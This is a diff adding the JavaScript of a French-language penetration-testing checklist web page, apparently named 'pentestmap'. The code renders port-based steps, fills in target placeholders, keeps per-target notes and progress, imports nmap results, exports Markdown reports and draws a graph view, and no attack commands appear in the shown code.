+  mtb.innerHTML='<button id="mainToggle" title="Replier / déplier les catégories">▾</button>';
+  main.appendChild(mtb);
+  DATA.forEach(group=>{
+    const ng=document.createElement('div');ng.className='nav-group';
+    const pa=document.createElement('a');
+    pa.className='phase';pa.href='#';pa.innerHTML='<span class="nchev">▾</span>'+esc(group.phase);
+    pa.onclick=e=>{e.preventDefault();ng.classList.toggle('collapsed');};
+    ng.appendChild(pa);nav.appendChild(ng);
+    const block=document.createElement('div');block.className='phase-block';
+    const ph=document.createElement('div');ph.className='phase-head';
+    ph.innerHTML='<span class="chev">▾</span><h3>'+esc(group.phase)+'</h3>';
+    ph.onclick=()=>block.classList.toggle('collapsed');
+    block.appendChild(ph);
+    const psec=document.createElement('div');psec.className='phase-sections';
+    block.appendChild(psec);main.appendChild(block);
+    group.sections.forEach(sec=>{
+      const na=document.createElement('a');na.className='seclink';na.dataset.sec=sec.id;
+      na.textContent=sec.port+' · '+sec.title;na.href='#'+sec.id;
+      na.onclick=e=>{e.preventDefault();document.getElementById(sec.id).scrollIntoView({behavior:'smooth'});};
+      ng.appendChild(na);
+
+      const el=document.createElement('section');
+      el.id=sec.id;
+      el.dataset.ports=(sec.port.match(/\d+/g)||[]).join(',');
+      el.dataset.search=(sec.title+' '+sec.port+' '+sec.svc+' '+sec.steps.map(s=>s.t+' '+s.c).join(' ')).toLowerCase();
+      const htlink=REFS[sec.id]?`<a class="htlink" href="${REFS[sec.id]}" target="_blank" rel="noopener" title="Ouvrir la page HackTricks" onclick="event.stopPropagation()">HackTricks ↗</a>`:'';
+      let html=`<div class="sec-head"><span class="port">${esc(sec.port)}</span>
+        <h2>${esc(sec.title)} <span class="svc">${esc(sec.svc)}</span></h2><span class="secprog"></span>${htlink}<span class="chev">▾</span></div><div class="sec-body">`;
+      (sec.notes||[]).forEach(n=>html+=`<div class="note">${n}</div>`);
+      sec.steps.forEach((st,idx)=>{
+        const sid=sec.id+':'+idx;
+        const needs=st.needs||[];
+        const reqs=needs.map(n=>`<span class="req" data-req="${n}" title="${esc(TAGS[n].desc)}">${esc(TAGS[n].label)}</span>`).join('');
+        html+=`<div class="step" data-needs="${needs.join(',')}">
+          <div class="title"><input type="checkbox" class="doneck" data-stepid="${sid}" title="Marquer comme fait"><span class="t">${esc(st.t)}</span><span class="reqs">${reqs}</span></div>
+          <div class="cmd"><div class="cmd-actions">
+            <button class="note-btn" data-stepid="${sid}" data-title="${esc(st.t)}">📝<span class="badge"></span></button>
+            <button class="copy">copier</button></div><span class="cmdtext">${renderCmd(st.c)}</span></div></div>`;
+      });
+      html+=`</div>`;
+      el.innerHTML=html;
+      el.querySelector('.sec-head').onclick=()=>el.classList.toggle('collapsed');
+      el.querySelectorAll('.copy').forEach(btn=>btn.onclick=ev=>{ev.stopPropagation();
+        const txt=btn.closest('.cmd').querySelector('.cmdtext').innerText;
+        navigator.clipboard.writeText(txt);
+        btn.textContent='copié ✓';btn.classList.add('ok');
+        setTimeout(()=>{btn.textContent='copier';btn.classList.remove('ok');},1200);});
+      el.querySelectorAll('.note-btn').forEach(btn=>btn.onclick=ev=>{ev.stopPropagation();openDrawer(btn.dataset.stepid,btn.dataset.title);});
+      el.querySelectorAll('.doneck').forEach(ck=>ck.onchange=()=>{toggleDone(ck.dataset.stepid,ck.checked);ck.closest('.step').classList.toggle('done',ck.checked);updateProgress();});
+      psec.appendChild(el);
+    });
+    const more=document.createElement('a');more.className='navmore';more.href='#';
+    more.onclick=e=>{e.preventDefault();ng.classList.toggle('show-all');applyFilters();};
+    ng.appendChild(more);
+  });
+  refreshTokens();
+  let navCol=false,mainCol=false;
+  const navBtn=document.getElementById('navToggle');
+  navBtn.onclick=()=>{navCol=!navCol;document.querySelectorAll('.nav-group').forEach(x=>x.classList.toggle('collapsed',navCol));navBtn.textContent=navCol?'▸':'▾';};
+  const mainBtn=document.getElementById('mainToggle');
+  mainBtn.onclick=()=>{mainCol=!mainCol;document.querySelectorAll('.phase-block,section').forEach(x=>x.classList.toggle('collapsed',mainCol));mainBtn.textContent=mainCol?'▸':'▾';};
+}
+
+function refreshTokens(){
+  const v={
+    IP:val('ip','<IP>'),DOMAIN:val('domain','<DOMAIN>'),DC:val('dc','<DC>'),
+    URL:val('url','<URL>'),USER:val('user','<USER>'),PASS:val('pass','<PASS>'),
+    LHOST:val('lhost','<listener_ip>'),IFACE:val('iface','<iface>'),
+    WORDLIST:val('wordlist','/usr/share/wordlists/rockyou.txt'),
+  };
+  document.querySelectorAll('.tok').forEach(t=>t.textContent=v[t.dataset.tok]);
+}
+function val(id,def){return document.getElementById(id).value.trim()||def;}
+
+// ============================================================
+//  CONTEXTE + FILTRES
+// ============================================================
+function buildCtxBar(){
+  const bar=document.getElementById('ctxchips');
+  bar.innerHTML=TOGGLES.map(t=>`<button class="ctxchip" data-t="${t}" title="${esc(TAGS[t].desc)}">${esc(TAGS[t].label)}</button>`).join('');
+  bar.querySelectorAll('.ctxchip').forEach(b=>{
+    if(ctx.has(b.dataset.t))b.classList.add('on');
+    b.onclick=()=>{const t=b.dataset.t;ctx.has(t)?ctx.delete(t):ctx.add(t);b.classList.toggle('on');saveCtx();applyFilters();};
+  });
+}
+
+function applyFilters(){
+  const q=document.getElementById('search').value.trim().toLowerCase();
+  const eff=effectiveCtx();
+  let any=false;
+  document.querySelectorAll('section').forEach(sec=>{
+    let visible=0,avail=0;
+    sec.querySelectorAll('.step').forEach(st=>{
+      const needs=(st.dataset.needs||'').split(',').filter(Boolean);
+      const ok=needs.every(n=>eff.has(n));
+      st.classList.toggle('locked',!ok);
+      st.querySelectorAll('.req').forEach(r=>{
+        const met=eff.has(r.dataset.req);
+        r.classList.toggle('met',met);r.classList.toggle('unmet',!met);
+      });
+      st.classList.toggle('reco',focusMode&&ok);
+      st.classList.toggle('reduced',((lockMode==='reduce')||focusMode)&&!ok);
+      const hide=lockMode==='hide'&&!ok;
+      st.classList.toggle('shidden',hide);
+      if(!hide)visible++;
+      if(ok)avail++;
+    });
+    const matchSearch=!q||sec.dataset.search.includes(q);
+    let portOK=true;
+    if(portFilter&&openPorts){
+      const ports=(sec.dataset.ports||'').split(',').filter(Boolean);
+      portOK=ports.length===0||ports.some(p=>openPorts.has(+p));
+    }
+    const show=matchSearch&&visible>0&&portOK;
+    sec.classList.toggle('hidden',!show);
+    if(show)any=true;
+    const navVisible=show&&!(focusMode&&avail===0);
+    const nl=document.querySelector('.seclink[data-sec="'+sec.id+'"]');
+    if(nl)nl.classList.toggle('navhide',!navVisible);
+    sec.classList.remove('applicable');
+    if(focusMode)sec.classList.toggle('focus-collapsed',avail===0);
+    else sec.classList.remove('focus-collapsed');
+    if(q&&show){sec.classList.remove('collapsed','focus-collapsed');const pb=sec.closest('.phase-block');if(pb)pb.classList.remove('collapsed');}
+  });
+  document.querySelectorAll('.nav-group').forEach(ng=>{
+    const hidden=ng.querySelectorAll('a.seclink.navhide').length;
+    ng.classList.toggle('has-hidden',hidden>0);
+    const more=ng.querySelector('.navmore');
+    if(more)more.textContent=ng.classList.contains('show-all')?'▾ masquer':('▸ '+hidden+' masquée'+(hidden>1?'s':''));
+  });
+  let e=document.getElementById('empty');
+  if(!any){if(!e){e=document.createElement('div');e.id='empty';e.className='empty';e.textContent='Aucune action ne correspond.';main.appendChild(e);}}
+  else if(e)e.remove();
+}
+
+// ============================================================
+//  CARNET DE BORD (notes par cible, localStorage)
+// ============================================================
+const NOTES_KEY="pentestmap_notes_v1";
+let curStep=null;
+const drawer=document.getElementById('drawer');
+const dInput=document.getElementById('drawer-input');
+const loadNotes=()=>{try{return JSON.parse(localStorage.getItem(NOTES_KEY))||{}}catch(e){return{}}};
+const saveNotes=n=>localStorage.setItem(NOTES_KEY,JSON.stringify(n));
+const curTarget=()=>document.getElementById('ip').value.trim()||"(sans cible)";
+const fmtTs=ts=>{try{return new Date(ts).toLocaleString();}catch(e){return ts;}};
+function entriesFor(sid){const n=loadNotes();return (n[curTarget()]&&n[curTarget()][sid])||[];}
+function addEntry(sid,text){const n=loadNotes(),t=curTarget();(n[t]=n[t]||{})[sid]=n[t][sid]||[];n[t][sid].unshift({ts:new Date().toISOString(),text});saveNotes(n);}
+function delEntry(sid,ts){const n=loadNotes(),t=curTarget();if(n[t]&&n[t][sid]){n[t][sid]=n[t][sid].filter(e=>e.ts!==ts);saveNotes(n);}}
+
+function stepMeta(sid){
+  const i=sid.lastIndexOf(':'),secId=sid.slice(0,i),idx=+sid.slice(i+1);
+  for(const g of DATA)for(const s of g.sections)if(s.id===secId)return {port:s.port,step:(s.steps[idx]||{}).t||sid};
+  return {port:'',step:sid};
+}
+
+// --- checklist / progression (par cible) ---
+const DONE_KEY="pentestmap_done_v1";
+const loadDone=()=>{try{return JSON.parse(localStorage.getItem(DONE_KEY))||{}}catch(e){return{}}};
+const saveDone=d=>localStorage.setItem(DONE_KEY,JSON.stringify(d));
+function toggleDone(sid,on){const d=loadDone(),t=curTarget();d[t]=d[t]||[];const i=d[t].indexOf(sid);
+  if(on&&i<0)d[t].push(sid);if(!on&&i>=0)d[t].splice(i,1);saveDone(d);}
+function updateProgress(){
+  const done=new Set(loadDone()[curTarget()]||[]);
+  let gT=0,gD=0;
+  document.querySelectorAll('section').forEach(sec=>{
+    const steps=[...sec.querySelectorAll('.step')];
+    const dn=steps.filter(s=>done.has(s.querySelector('.doneck').dataset.stepid)).length;
+    gT+=steps.length;gD+=dn;
+    const sp=sec.querySelector('.secprog');if(sp)sp.textContent=dn?dn+'/'+steps.length:'';
+  });
+  document.getElementById('progress').textContent='Progression : '+gD+'/'+gT+(gT?' ('+Math.round(gD/gT*100)+'%)':'');
+}
+function refreshDone(){
+  const done=new Set(loadDone()[curTarget()]||[]);
+  document.querySelectorAll('.doneck').forEach(ck=>{
+    const on=done.has(ck.dataset.stepid);ck.checked=on;ck.closest('.step').classList.toggle('done',on);
+  });
+  updateProgress();
+}
+
+// --- import / export du carnet complet ---
+function exportJson(){
+  const data={version:1,notes:loadNotes(),done:loadDone(),ctx:[...ctx]};
+  download('pentestmap_backup.json',JSON.stringify(data,null,2),'application/json');
+}
+function importJson(file){
+  const r=new FileReader();
+  r.onload=()=>{try{const d=JSON.parse(r.result);
+    if(d.notes)localStorage.setItem(NOTES_KEY,JSON.stringify(d.notes));
+    if(d.done)localStorage.setItem(DONE_KEY,JSON.stringify(d.done));
+    if(Array.isArray(d.ctx)){ctx=new Set(d.ctx);saveCtx();}
+    build();buildCtxBar();applyFilters();refreshBadges();refreshDone();renderDefault();
+    alert('Import réussi.');
+  }catch(e){alert('Fichier JSON invalide.');}};
+  r.readAsText(file);
+}
+
+// --- import nmap : filtrer par ports ouverts ---
+function parseNmap(text){
+  const ports=new Set();let m;
+  let re=/(\d+)\/(?:tcp|udp)\s+open/gi;        // sortie normale (.nmap)
+  while(m=re.exec(text))ports.add(+m[1]);
+  re=/(\d+)\/open\/(?:tcp|udp)/gi;             // .gnmap
+  while(m=re.exec(text))ports.add(+m[1]);
+  re=/portid="(\d+)"[^>]*>\s*<state state="open"/gi; // .xml
+  while(m=re.exec(text))ports.add(+m[1]);
+  return ports;
+}
+function parseTarget(text){
+  let m=text.match(/Nmap scan report for [^\n(]*\(([\d.]+)\)/);if(m)return m[1];
+  m=text.match(/Nmap scan report for ([\d.]+)/);if(m)return m[1];
+  m=text.match(/Nmap scan report for ([^\s]+)/);return m?m[1]:null;
+}
+function updateNmapStatus(){
+  const el=document.getElementById('nmapStatus');
+  if(openPorts&&portFilter){
+    el.innerHTML=openPorts.size+' ports ouverts : '+[...openPorts].sort((a,b)=>a-b).join(', ')+' <button id="nmapClear" title="Retirer le filtre nmap">✕</button>';
+    document.getElementById('nmapClear').onclick=clearNmap;
+  }else el.innerHTML='';
+}
+function clearNmap(){openPorts=null;portFilter=false;updateNmapStatus();applyFilters();}
+function loadNmap(text){
+  const ports=parseNmap(text);
+  if(!ports.size){alert('Aucun port ouvert détecté dans ce fichier nmap.');return;}
+  openPorts=ports;portFilter=true;
+  const tgt=parseTarget(text);
+  if(tgt){
+    if(/^\d{1,3}(\.\d{1,3}){3}$/.test(tgt))document.getElementById('ip').value=tgt;
+    else document.getElementById('domain').value=tgt;
+    refreshTokens();refreshBadges();refreshDone();renderDefault();
+  }
+  updateNmapStatus();applyFilters();
+}
+function openDrawer(sid,title){
+  curStep={sid,title};drawer.classList.add('has-sel');
+  document.getElementById('drawer-title').textContent='📝 '+title;
+  document.getElementById('drawer-sub').textContent='Cible : '+curTarget();
+  dInput.value='';renderHistory();dInput.focus();
+}
+let noteView='cmd';
+function toggleFinding(sid,ts){const n=loadNotes(),t=curTarget();const arr=n[t]&&n[t][sid];
+  if(arr){const e=arr.find(x=>x.ts===ts);if(e){e.finding=!e.finding;saveNotes(n);}}}
+function allEntries(onlyFind){
+  const data=loadNotes()[curTarget()]||{};const arr=[];
+  Object.keys(data).forEach(sid=>data[sid].forEach(e=>{if(!onlyFind||e.finding)arr.push(Object.assign({sid},e));}));
+  arr.sort((a,b)=>a.ts<b.ts?1:-1);return arr;
+}
+function cmdListHtml(){
+  const data=loadNotes()[curTarget()]||{};
+  const ids=Object.keys(data).filter(k=>data[k]&&data[k].length);
+  if(!ids.length)return '<div class="hist-empty">Aucune note pour cette cible.<br>Clique le crayon d\'une commande pour enregistrer sa sortie.</div>';
+  return '<div class="sumtitle">'+ids.length+' commande(s) documentée(s)</div>'+ids.map(sid=>{
+    const m=stepMeta(sid);
+    return `<button class="sumrow jump" data-sid="${sid}"><span class="sumcount">${data[sid].length}</span>
+      <span class="sumtxt"><b>[${esc(m.port)}]</b> ${esc(m.step)}</span></button>`;
+  }).join('');
+}
+function entriesHtml(onlyFind){
+  const arr=allEntries(onlyFind);
+  if(!arr.length)return '<div class="hist-empty">'+(onlyFind?'Aucun finding. Marque une entrée avec ★ dans l\'historique d\'une commande.':'Aucune note pour cette cible.')+'</div>';
+  return arr.map(e=>{const m=stepMeta(e.sid);
+    return `<div class="entry"><div class="entry-head"><span class="when">${fmtTs(e.ts)}</span>
+      <button class="jump" data-sid="${e.sid}">[${esc(m.port)}] ${esc(m.step)}</button>
+      ${e.finding?'<span class="findtag">finding</span>':''}</div>
+      <pre>${esc(e.text)}</pre></div>`;
+  }).join('');
+}
+function renderDefault(){
+  curStep=null;drawer.classList.remove('has-sel');
+  document.getElementById('drawer-title').textContent='Carnet de bord';
+  document.getElementById('drawer-sub').textContent='Cible : '+curTarget();
+  const v=[['cmd','Commandes'],['time','Timeline'],['find','Findings']];
+  const sw='<div class="viewsw">'+v.map(x=>`<button data-v="${x[0]}" class="${noteView===x[0]?'on':''}">${x[1]}</button>`).join('')+'</div>';
+  const body=noteView==='cmd'?cmdListHtml():entriesHtml(noteView==='find');
+  const box=document.getElementById('drawer-history');
+  box.innerHTML=sw+body;
+  box.querySelectorAll('.viewsw button').forEach(b=>b.onclick=()=>{noteView=b.dataset.v;renderDefault();});
+  box.querySelectorAll('.jump').forEach(b=>b.onclick=()=>openDrawer(b.dataset.sid,stepMeta(b.dataset.sid).step));
+}
+function renderHistory(){
+  const box=document.getElementById('drawer-history');
+  if(!curStep){renderDefault();return;}
+  const ents=entriesFor(curStep.sid);
+  if(!ents.length){box.innerHTML='<div class="hist-empty">Aucun résultat enregistré pour cette commande sur cette cible.</div>';return;}
+  box.innerHTML=ents.map(e=>`<div class="entry">
+      <div class="entry-head"><span class="when">${fmtTs(e.ts)}</span>
+        <button class="star ${e.finding?'on':''}" data-ts="${e.ts}" title="Marquer comme finding">★</button>
+        <button class="del" data-ts="${e.ts}" title="Supprimer">✕</button></div>
+      <pre>${esc(e.text)}</pre></div>`).join('');
+  box.querySelectorAll('.star').forEach(b=>b.onclick=()=>{toggleFinding(curStep.sid,b.dataset.ts);renderHistory();});
+  box.querySelectorAll('.del').forEach(b=>b.onclick=()=>{delEntry(curStep.sid,b.dataset.ts);renderHistory();refreshBadges();});
+}
+function doSave(){if(!curStep)return;const txt=dInput.value.trim();if(!txt)return;addEntry(curStep.sid,txt);dInput.value='';renderHistory();refreshBadges();}
+function refreshBadges(){
+  const n=loadNotes()[curTarget()]||{};
+  document.querySelectorAll('.note-btn').forEach(btn=>{
+    const c=(n[btn.dataset.stepid]||[]).length;
+    btn.classList.toggle('has',c>0);btn.querySelector('.badge').textContent=c;
+  });
+}
+document.getElementById('drawer-save').onclick=doSave;
+document.getElementById('drawer-clear').onclick=()=>{dInput.value='';dInput.focus();};
+document.getElementById('drawer-close').onclick=renderDefault;
+dInput.addEventListener('keydown',e=>{if((e.metaKey||e.ctrlKey)&&e.key==='Enter')doSave();});
+document.addEventListener('keydown',e=>{if(e.key==='Escape'&&curStep)renderDefault();});
+
+// ============================================================
+//  EXPORT RAPPORT
+// ============================================================
+function download(name,content,type){
+  const blob=new Blob([content],{type:type||'text/plain'});
+  const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download=name;
+  document.body.appendChild(a);a.click();a.remove();URL.revokeObjectURL(a.href);
+}
+function exportReport(){
+  const t=curTarget(),data=loadNotes()[t]||{};
+  let md=`# Rapport pentest - ${t}\n\n_Généré le ${new Date().toLocaleString()}_\n\n`;
+  const finds=[];
+  Object.keys(data).forEach(sid=>data[sid].forEach(e=>{if(e.finding)finds.push(Object.assign({sid},e));}));
+  finds.sort((a,b)=>a.ts<b.ts?1:-1);
+  if(finds.length){md+='## Findings\n\n';
+    finds.forEach(e=>{const m=stepMeta(e.sid);
+      md+=`- **[${m.port}] ${m.step}** _(${fmtTs(e.ts)})_\n\n  \`\`\`\n  ${e.text.replace(/\n/g,'\n  ')}\n  \`\`\`\n\n`;});
+    md+='---\n\n';
+  }
+  let count=0;
+  DATA.forEach(g=>g.sections.forEach(sec=>sec.steps.forEach((st,i)=>{
+    const ents=data[sec.id+':'+i];
+    if(ents&&ents.length){count++;
+      md+=`## [${sec.port}] ${sec.title} - ${st.t}\n\n`;
+      ents.slice().reverse().forEach(e=>{md+=`**${fmtTs(e.ts)}**\n\n\`\`\`\n${e.text}\n\`\`\`\n\n`;});
+    }
+  })));
+  if(!count)md+='_(aucune note enregistrée pour cette cible)_\n';
+  download('rapport_'+t.replace(/[^\w.-]/g,'_')+'.md',md,'text/markdown');
+}
+document.getElementById('exportBtn').onclick=exportReport;
+document.getElementById('exportJson').onclick=exportJson;
+document.getElementById('importJson').onclick=()=>document.getElementById('importFile').click();
+document.getElementById('importFile').onchange=e=>{if(e.target.files[0])importJson(e.target.files[0]);e.target.value='';};
+const THEME_KEY="pentestmap_theme";
+if(localStorage.getItem(THEME_KEY)==='light')document.body.classList.add('light');
+document.getElementById('themeBtn').onclick=()=>{document.body.classList.toggle('light');
+  localStorage.setItem(THEME_KEY,document.body.classList.contains('light')?'light':'dark');};
+
+// ============================================================
+//  WIRING
+// ============================================================
+['ip','domain','dc','url','user','pass','lhost','iface','wordlist'].forEach(id=>document.getElementById(id).addEventListener('input',refreshTokens));
+document.getElementById('ip').addEventListener('input',()=>{refreshBadges();refreshDone();
+  if(curStep){document.getElementById('drawer-sub').textContent='Cible : '+curTarget();renderHistory();}else renderDefault();});
+document.getElementById('search').addEventListener('input',applyFilters);
+(function(){const seg=document.getElementById('lockMode');
+  seg.querySelectorAll('button').forEach(b=>{
+    if(b.dataset.m===lockMode)b.classList.add('on');
+    b.onclick=()=>{lockMode=b.dataset.m;localStorage.setItem(MODE_KEY,lockMode);
+      seg.querySelectorAll('button').forEach(x=>x.classList.toggle('on',x.dataset.m===lockMode));applyFilters();};
+  });})();
+(function(){const b=document.getElementById('focusBtn');if(focusMode)b.classList.add('on');
+  b.onclick=()=>{focusMode=!focusMode;b.classList.toggle('on',focusMode);localStorage.setItem("pentestmap_focus_v1",focusMode?'1':'0');applyFilters();};})();
+
+// ============================================================
+//  VUE GRAPHIQUE (force-directed, canvas natif)
+// ============================================================
+const gmodal=document.getElementById('graphModal');
+const gcanvas=document.getElementById('graphCanvas');
+let gctx,gnodes=[],glinks=[],graf=null,gview={x:0,y:0,s:1},ghover=null,gdrag=null,gpan=null,gmoved=false,G_COL={},gShowAll=false;
+const gOpen=()=>!gmodal.classList.contains('hidden');
+
+function buildGraphData(){
+  gnodes=[];glinks=[];
+  const eff=effectiveCtx();
+  const cx=gcanvas.width/2,cy=gcanvas.height/2;
+  const center={id:'__t',type:'target',label:curTarget(),x:cx,y:cy,vx:0,vy:0,r:15};
+  gnodes.push(center);
+  // pré-calcul : phases ayant au moins une section à afficher
+  const phases=DATA.map(g=>{
+    const secs=g.sections.map(sec=>{
+      let a=0;sec.steps.forEach(st=>{if((st.needs||[]).every(n=>eff.has(n)))a++;});
+      const pn=(sec.port.match(/\d+/g)||[]).map(Number);
+      const portOK=!(portFilter&&openPorts)||pn.length===0||pn.some(p=>openPorts.has(p));
+      return {sec,avail:a>0,portOK};
+    });
+    const base=gShowAll?secs:secs.filter(o=>o.avail);
+    return {g,secs:base.filter(o=>o.portOK)};
+  }).filter(p=>p.secs.length);
+  phases.forEach((p,pi)=>{
+    const ang=pi/phases.length*Math.PI*2-Math.PI/2;
+    const pn={id:'p'+pi,type:'phase',label:p.g.phase,x:cx+Math.cos(ang)*200,y:cy+Math.sin(ang)*200,vx:0,vy:0,r:11};
+    gnodes.push(pn);glinks.push({s:center,t:pn,L:190});
+    p.secs.forEach((o,si)=>{
+      const sec=o.sec,a2=ang+(si-(p.secs.length-1)/2)*0.13;
+      const sn={id:sec.id,type:'section',secId:sec.id,label:sec.port+' '+sec.title,avail:o.avail,
+        x:pn.x+Math.cos(a2)*80,y:pn.y+Math.sin(a2)*80,vx:0,vy:0,r:6};
+      gnodes.push(sn);glinks.push({s:pn,t:sn,L:85});
+    });
+  });
+}
+function gstep(){
+  const REP=1500,SPRING=0.025,DAMP=0.85,GRAV=0.0025,cx=gcanvas.width/2,cy=gcanvas.height/2;
+  gnodes.forEach(n=>{n.fx=0;n.fy=0;});
+  for(let i=0;i<gnodes.length;i++)for(let j=i+1;j<gnodes.length;j++){
+    const a=gnodes[i],b=gnodes[j];let dx=a.x-b.x,dy=a.y-b.y,d2=dx*dx+dy*dy;if(d2<1)d2=1;
+    const d=Math.sqrt(d2),f=REP/d2,ux=dx/d,uy=dy/d;
+    a.fx+=ux*f;a.fy+=uy*f;b.fx-=ux*f;b.fy-=uy*f;
+  }
+  glinks.forEach(l=>{const a=l.s,b=l.t;let dx=b.x-a.x,dy=b.y-a.y,d=Math.sqrt(dx*dx+dy*dy)||1;
+    const diff=(d-l.L)*SPRING,ux=dx/d,uy=dy/d;
+    a.fx+=ux*diff;a.fy+=uy*diff;b.fx-=ux*diff;b.fy-=uy*diff;});
+  gnodes.forEach(n=>{
+    if(n.type==='target'){n.x=cx;n.y=cy;n.vx=0;n.vy=0;return;}
+    if(n===gdrag)return;
+    n.fx+=(cx-n.x)*GRAV;n.fy+=(cy-n.y)*GRAV;
+    n.vx=(n.vx+n.fx)*DAMP;n.vy=(n.vy+n.fy)*DAMP;n.x+=n.vx;n.y+=n.vy;
+  });
+}
+function gArrow(a,b){
+  let dx=b.x-a.x,dy=b.y-a.y,d=Math.sqrt(dx*dx+dy*dy)||1,ux=dx/d,uy=dy/d;
+  const sx=a.x+ux*(a.r+1),sy=a.y+uy*(a.r+1),ex=b.x-ux*(b.r+1),ey=b.y-uy*(b.r+1);
+  gctx.strokeStyle=G_COL.border;gctx.lineWidth=1;
+  gctx.beginPath();gctx.moveTo(sx,sy);gctx.lineTo(ex,ey);gctx.stroke();
+  const ah=6,aa=Math.atan2(uy,ux);gctx.fillStyle=G_COL.border;
+  gctx.beginPath();gctx.moveTo(ex,ey);
+  gctx.lineTo(ex-ah*Math.cos(aa-0.4),ey-ah*Math.sin(aa-0.4));
+  gctx.lineTo(ex-ah*Math.cos(aa+0.4),ey-ah*Math.sin(aa+0.4));
+  gctx.closePath();gctx.fill();
+}
+function gNode(n){
+  let col=n.type==='section'?(n.avail?G_COL.green:G_COL.muted):G_COL.accent;
+  if(n===ghover)col=G_COL.txt;
+  gctx.fillStyle=col;gctx.beginPath();gctx.arc(n.x,n.y,n.r,0,7);gctx.fill();
+  if(n.type!=='section'||n===ghover||gview.s>1.3){
+    gctx.fillStyle=G_COL.txt;
+    gctx.font=(n.type==='section')?'10px sans-serif':'bold 12px sans-serif';
+    gctx.textAlign='center';gctx.fillText(n.label,n.x,n.y-n.r-4);
+  }
+}
+function gdraw(){
+  gctx.setTransform(1,0,0,1,0,0);gctx.clearRect(0,0,gcanvas.width,gcanvas.height);
+  gctx.save();gctx.translate(gview.x,gview.y);gctx.scale(gview.s,gview.s);
+  glinks.forEach(l=>gArrow(l.s,l.t));gnodes.forEach(gNode);gctx.restore();
+}
+function gloop(){if(!gOpen())return;gstep();gdraw();graf=requestAnimationFrame(gloop);}
+function gSize(){gcanvas.width=gcanvas.clientWidth;gcanvas.height=gcanvas.clientHeight;}
+function openGraph(){
+  gmodal.classList.remove('hidden');gSize();gctx=gcanvas.getContext('2d');
+  const cs=getComputedStyle(document.body);
+  G_COL={accent:cs.getPropertyValue('--accent').trim(),green:cs.getPropertyValue('--green').trim(),
+    muted:cs.getPropertyValue('--muted').trim(),txt:cs.getPropertyValue('--txt').trim(),border:cs.getPropertyValue('--border').trim()};
+  gview={x:0,y:0,s:1};buildGraphData();gloop();
+}
+function closeGraph(){gmodal.classList.add('hidden');if(graf)cancelAnimationFrame(graf);}
+function graphJump(secId){closeGraph();const el=document.getElementById(secId);
+  if(el){el.classList.remove('collapsed','focus-collapsed');const pb=el.closest('.phase-block');if(pb)pb.classList.remove('collapsed');
+    el.scrollIntoView({behavior:'smooth',block:'center'});}}
+function gWorld(ev){const r=gcanvas.getBoundingClientRect(),sx=ev.clientX-r.left,sy=ev.clientY-r.top;
+  return {x:(sx-gview.x)/gview.s,y:(sy-gview.y)/gview.s,sx,sy};}
+function gPick(wx,wy){let best=null,bd=1e9;gnodes.forEach(n=>{const dx=n.x-wx,dy=n.y-wy,d=dx*dx+dy*dy;
+  if(d<(n.r+8)*(n.r+8)&&d<bd){bd=d;best=n;}});return best;}
+gcanvas.addEventListener('mousedown',ev=>{const w=gWorld(ev);const n=gPick(w.x,w.y);gmoved=false;
+  if(n)gdrag=n;else gpan={x:ev.clientX,y:ev.clientY,vx:gview.x,vy:gview.y};});
+window.addEventListener('mousemove',ev=>{if(!gOpen())return;const w=gWorld(ev);
+  if(gdrag){gdrag.x=w.x;gdrag.y=w.y;gdrag.vx=0;gdrag.vy=0;gmoved=true;}
+  else if(gpan){gview.x=gpan.vx+(ev.clientX-gpan.x);gview.y=gpan.vy+(ev.clientY-gpan.y);gmoved=true;}
+  else{ghover=gPick(w.x,w.y);gcanvas.style.cursor=ghover?'pointer':'grab';}});
+window.addEventListener('mouseup',()=>{if(gdrag&&!gmoved&&gdrag.type==='section')graphJump(gdrag.secId);gdrag=null;gpan=null;});
+gcanvas.addEventListener('wheel',ev=>{ev.preventDefault();const w=gWorld(ev),f=ev.deltaY<0?1.1:0.9;
+  gview.s=Math.max(0.3,Math.min(4,gview.s*f));gview.x=w.sx-w.x*gview.s;gview.y=w.sy-w.y*gview.s;},{passive:false});
+window.addEventListener('resize',()=>{if(gOpen())gSize();});
+document.getElementById('graphBtn').onclick=openGraph;
+document.getElementById('graphClose').onclick=closeGraph;
+document.getElementById('graphFilter').onclick=function(){gShowAll=!gShowAll;
+  this.classList.toggle('on',!gShowAll);this.textContent=gShowAll?'Afficher tout':'Faisables seulement';
+  if(gOpen())buildGraphData();};
+document.getElementById('nmapBtn').onclick=()=>document.getElementById('nmapFile').click();
+document.getElementById('nmapFile').onchange=e=>{const f=e.target.files[0];if(!f)return;
+  const r=new FileReader();r.onload=()=>loadNmap(r.result);r.readAsText(f);e.target.value='';};
+document.addEventListener('keydown',e=>{if(e.key==='Escape'&&gOpen())closeGraph();});
+
+build();
+buildCtxBar();
+applyFilters();
+refreshBadges();
+refreshDone();
+renderDefault();
+</script>
+</body>
+</html>
